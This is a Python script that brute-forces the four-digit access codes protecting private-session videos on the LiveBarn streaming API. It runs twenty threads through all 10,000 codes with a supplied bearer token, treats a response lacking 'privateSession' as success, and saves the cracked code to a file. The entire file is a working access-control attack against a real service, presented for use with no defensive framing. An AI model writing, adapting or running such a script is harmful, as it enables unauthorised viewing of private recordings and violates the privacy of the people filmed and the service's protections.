import requests
import concurrent.futures
import threading
import time
import json
import sys
import re
from tqdm import tqdm

log_intermediate = False

num_of_threads = 20
error_result = "UNKNOWN"
start = 0
end = 10_000

def make_request(token, surface_id, feed_mode, begin_date, code):
    headers = {'Authorization': 'Bearer ' + token}
    # 0 - token
    # 1 - surfaceId
    # 2 - feedmodeId
    # 3 - beginDate: ex. 2023-02-28T11:30
    # 4 - code
    video_url = "https://webapi.livebarn.com/api/v2.0.0/media/surfaceid/{}/feedmodeid/{}/begindate/{}/code/{}"

    response = requests.get(video_url.format(surface_id, feed_mode, begin_date, code), headers=headers)
    if response.status_code != 200:
        raise Exception('Failed to get video content: {}'.format(response.content))
    return response

def crack_password(token, surface_id, begin_date, code_start, code_end):
    key_string="privateSession"
    for num in tqdm(range(code_start, code_end), desc='{} - {} '.format(code_start, code_end).rjust(15)):
        code = "{:04d}".format(num)
        # print("Trying {}...\r".format(code))
        resp = make_request(token, surface_id, 5, begin_date, code)
        payload = resp.json()
        if log_intermediate:
            write_to_file(code, json.dumps(payload))
        
        if key_string in payload[0]:
            continue
        else:
            return code
    
    return error_result

def write_to_file(code, content):
    with open('{}.log'.format(code), 'w') as f:
        f.write(content)
        f.close()

def show_help():
    print("Usage: <livebarn_url>")

def parse_url(url):
    pattern = r"surfaceid/(\d+)/feedmodeid/\d+/begindate/(\d{4}-\d{2}-\d{2}T\d{2}:\d{2})"
    match = re.search(pattern, url)

    if match:
        surface_id = match.group(1)
        time_slot = match.group(2)
        return surface_id, time_slot
    else:
        raise Exception("Unable to parse URL {}".format(url))

# Main:
if len(sys.argv) != 2:
    show_help()
    sys.exit(1)

url = sys.argv[1]

# parse URL for surface_id and time_slot
surface_id, time_slot = parse_url(url)
print("surface_id: {} | time_slot: {}".format(surface_id, time_slot))

token = input("What's the bearer token?")

with concurrent.futures.ThreadPoolExecutor() as executor:
    step = int((end-start)/num_of_threads)
    futures = [executor.submit(crack_password, token, surface_id, time_slot, i, i+step-1) for i in range(start, end, step)]
    done, not_done = concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)

    for future in done:
        # for future in concurrent.futures.as_completed(futures):
        try:
            access_code = future.result()
            if access_code != error_result:
                # success
                write_to_file("cracked", access_code)

                for in_progress_future in not_done:
                    in_progress_future.cancel()
                break
        except Exception as ex:
            error = 'Error: {}'.format(ex)
            print(error)
            write_to_file("error", error)
    
    executor.shutdown(wait=False)

